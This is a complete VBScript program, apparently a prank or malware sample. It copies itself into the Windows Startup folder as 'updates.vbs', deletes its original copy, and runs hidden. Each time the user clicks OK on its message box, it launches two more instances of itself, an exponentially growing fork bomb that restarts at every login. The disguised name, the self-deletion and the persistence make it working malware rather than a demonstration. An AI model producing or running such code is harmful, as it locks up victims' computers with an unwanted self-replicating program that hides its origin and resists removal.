Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set objArgs = WScript.Arguments

startupPath = objShell.SpecialFolders("Startup") & "\updates.vbs"
quotedStartupPath = """" & startupPath & """"

If LCase(WScript.ScriptFullName) <> LCase(startupPath) Then

    fso.CopyFile WScript.ScriptFullName, startupPath, True

    fso.DeleteFile WScript.ScriptFullName, True

    objShell.Run "wscript.exe " & quotedStartupPath, 0, False
    WScript.Quit
End If

If objArgs.Count > 0 Then
    count = CInt(objArgs(0))
Else
    count = 1
End If

response = MsgBox("this is message number " & count, vbOKOnly, "Lovely message from Hagai Badichi")

' If user clicks OK, spawn two new instances with incremented count
If response = vbOK Then
    objShell.Run "wscript.exe " & quotedStartupPath & " " & (count + 1), 0, False
    objShell.Run "wscript.exe " & quotedStartupPath & " " & (count + 2), 0, False
End If
